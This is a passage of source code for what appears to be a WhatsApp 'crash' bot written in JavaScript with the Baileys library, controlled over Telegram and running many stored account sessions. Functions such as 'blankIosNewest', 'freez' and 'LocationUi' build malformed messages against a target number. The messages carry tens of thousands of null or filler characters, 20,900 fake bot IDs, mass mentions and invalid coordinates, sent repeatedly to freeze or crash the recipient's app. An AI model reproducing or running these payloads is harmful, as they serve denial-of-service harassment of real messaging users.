ee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};
    
async function blankIosNewest(sock, target) {
botTag = Array.from({ length: 20900 }, (_, p) => `8670513176${p}@bot`);
y = Math.floor(Math.random() * 500000000)
yy = `BEGIN:VCARD\nVERSION:3.0\nN:;( • ⟆྄𝐅͢𝚯𝐑͢𝐂𝚺͢ - 𝚺𝐆͢𝐆྄⟅⬩〉# 𝐓𝐫4𝐬𝐡𝐞𝐝 - 𝐓𝐞𝐚𝐦 🎲 ꢵ;;;\nFN:( • ⟆྄𝐅͢𝚯𝐑͢𝐂𝚺͢ - 𝚺𝐆͢𝐆྄⟅⬩〉# 𝐓𝐫4𝐬𝐡𝐞𝐝 - 𝐓𝐞𝐚𝐦 🎲 ꢵ\nORG:mama\nTEL;type=CELL;type=VOICE;waid=5512997641074:+55 12 99764-1074\nEND:VCARD`

for (let i = 0; i < 5; i++) {
const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
contactsArrayMessage: {
displayName: "X",
contacts: [
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
}
],
contextInfo: {
botMessageSharingInfo: {
forwardScore: 9999
},
forwardedAiBotMessageInfo: {
botName: " Revengers - Team ¿? ",
botJid: botTag,
creatorName: " Ai X "
},
externalAdReply: {
automatedGreetingMessageShown: true,
automatedGreetingMessageCtaType: "\u0000".repeat(100000),
greetingMessageBody: " Revengers Is Backk¿? "
}
}
}
}
}
}, { participant: { jid: target } })

await sock.relayMessage(target, msg.message, {})
}
}
    
async function freez(sock, target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/641610487_1446846757033283_2569361697473754136_n.enc?ccb=11-4&oh=01_Q5Aa3wEungB1hAjqnphK_bpLvMxlTkyWtniorOPgl_8OerdVqA&oe=69C6B9B1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "Zs2wV//IMZTRU65eYtIyJnwpnP0ezH6Y3iGCAostwTE=",
                        fileLength: "3071735",
                        seconds: 27,
                        mediaKey: "62R87Wxh7Kif/OxF56uVuIQB4zKK/gX0e4bD+YRQ848=",
                        height: 850,
                        width: 478,
                        fileEncSha256: "w1ZN8WBbuDYaF3tDwYypvSw3/WsRfK1/HxvYUU2cz24=",
                        directPath: "/v/t62.7161-24/641610487_1446846757033283_2569361697473754136_n.enc?ccb=11-4&oh=01_Q5Aa3wEungB1hAjqnphK_bpLvMxlTkyWtniorOPgl_8OerdVqA&oe=69C6B9B1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1772045506",
                        contextInfo: {
                            pairedMediaType: "NOT_PAIRED_MEDIA",
                            forwardingScore: 999,
                            isForwarded: true,
                            businessMessageForwardInfo: {
                                businessOwnerJid: "13135550202@s.whatsapp.net"
                            },
                            mentionedJid: Array.from(
                                { length: 2000 },
                                (_, i) => `628${i + 1}990${i + 1}@s.whatsapp.net`
                            )
                        },
                        streamingSidecar: "k4mWMLH2XG7MaWWMPxHpyTWcy3EdAsQ4VsCTFKvN1joH3KP2KlmEF4iXYbg1WuMLPzne9x9g5RrS1ibmUNpYZPcBOSt/wcIUBTKkcqGNUfjwUs8Jdj0b5elKziKDUt3loL6lgir+JABokXOYe2Q4Fv1g/1RH6dmf3VQVnZuLPO6dnuIAgXkBpF/qgH/rec0EyuELdJP96gbNPCDVP2XS7mgTqHdE1rtMAUyKXMUL355zDqZB98FbOGRLOILMV38JArlx6OjyzAWG3CZldLxNKeRJM36jveZpmyPOKTXO1XA9qNtu44QZ37GvAAs0whw5/I2/7u5rMQjhixsPY9HUd82K0VccCSpUm/JI0D7bzZQyr9yw6glTL4/Ab3v/AquQzXeqvos9TnMvn0ByaXE18NzQD0Lrrfza9FHR+5+WpKYc0dYyslkx2Zp/+z+oPn1ambW+tKjyax2e8hAAGoVZa8AurpMhPvEYswAK6kmn3aeXim9LMhPKrHDMLIKhu4WBd4N3wD/9ZK+2uo1o7gLIp5TlGAhdsfOe6+ca5xyAwADWBhiHJdZw06+DKzAgtsfUb+Maem9kS1gptGReIGBGKFM66Xdl0Ai8cpFUfeOSInirURiDqFE=",
                        thumbnailDirectPath: "/v/t62.36147-24/534810281_908969998546564_3603710379076274248_n.enc?ccb=11-4&oh=01_Q5Aa3wGrAdvK5r0cUN_BG-nLQOqJPh3lVENsZ1PVDgqDfhvZkg&oe=69C6AA84&_nc_sid=5e03e0",
                        thumbnailSha256: "4LuL0s28LcE+8dW4mYG+GLYw8yl3LZ4QPPhaARkfBmU=",
                        thumbnailEncSha256: "5gnHasnQkNxJjqswSQDKyEXJ6SW5tvwCcPZqw22EbQ4=",
                        annotations: [
                            {
                                polygonVertices: [
                                    { x: 0.020762423053383827, y: 0.27248817682266235 },
                                    { x: 1.0120298862457275, y: 0.29351872205734253 },
                                    { x: 0.9789597988128662, y: 0.7867149114608765 },
                                    { x: -0.012307574972510338, y: 0.7656844258308411 }
                                ],
                                shouldSkipConfirmation: true,
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "1418069422677984",
                                        songId: "292111031335475",
                                        author: "᬴".repeat(60000),
                                        title: "᬴".repeat(60000),
                                        artworkDirectPath: "/v/t62.76458-24/56159361_1438661814433677_4172681711438316939_n.enc?ccb=11-4&oh=01_Q5Aa3wHk897EFVmByrMkQR1h_MfpZvXGkXhfIcaKVZBRcpkPEQ&oe=69C6A397&_nc_sid=5e03e0",
                                        artworkSha256: "yI2uyPuiJkVQP1YCijKWG9DRBy3BgwT3imlyTD3x96k=",
                                        artworkEncSha256: "rKdmZDKB4sQ98ZDrla2bLNc4bkuEDMoh3pbz9CFYeUQ=",
                                        artistAttribution: "https://www.instagram.com/_u/rexorangecounty",
                                        countryBlocklist: "UlU=",
                                        isExplicit: true,
                                        artworkMediaKey: "7Wi7CS7NSKztYzdpaJQNrwtOff4X6Rkh094l3ciNWGc="
                                    }
                                },
                                embeddedAction: true
                            }
                        ]
                    }
                }
            }
        },
        {
            participant: { jid: target }
        }
    );
}

async function LocationUi(sock, target) {
const object1 = "ꦾ".repeat(10000);
const object2 = "ꦾ".repeat(10000);
  const object = {
    locationMessage: {
      degreesLatitude: -1e15,
      degreesLongtitude: -999,
      name: "Revengers -" + object1,
      address: object2 + object1,
      url: `https://${object2}.com`,
      jpegThumbnail: Buffer.alloc(0),
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        bussinesForwardingInfo: {
          bussinesOwnerJid: target
        },
        mentionedJid: [target, "13135550002@s.whatsapp.net"],
      }
    }
  }
  await sock.relayMessage(target, object, {
    messageId: sock.generateMessageTag()
  });
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
            
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
    
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}
bot.onText(/^\/backup$/i, async (msg) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  await bot.sendMessage(chat, '⏳ Membuat backup, mohon tunggu...')
  await runBackupJob()
  await bot.sendMessage(chat, '✅ Backup selesai dan dikirim.')
})

 //════════════════════════════════════════════════════════════
// ===================== AUTO BACKUP SYSTEM =====================
// ════════════════════════════════════════════════════════════

const BACKUP_DIR = path.join(__dirname, 'backups')
if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true })

const BACKUP_EXCLUDE_DIRS = ['node_modules', '.npm', 'backups', '.cache', 'permenmd', 'user_logs', 'uploads']

function collectFilesForBackup(dir, baseDir = dir, fileList = []) {
  const entries = fs.readdirSync(dir, { withFileTypes: true })

  for (const entry of entries) {
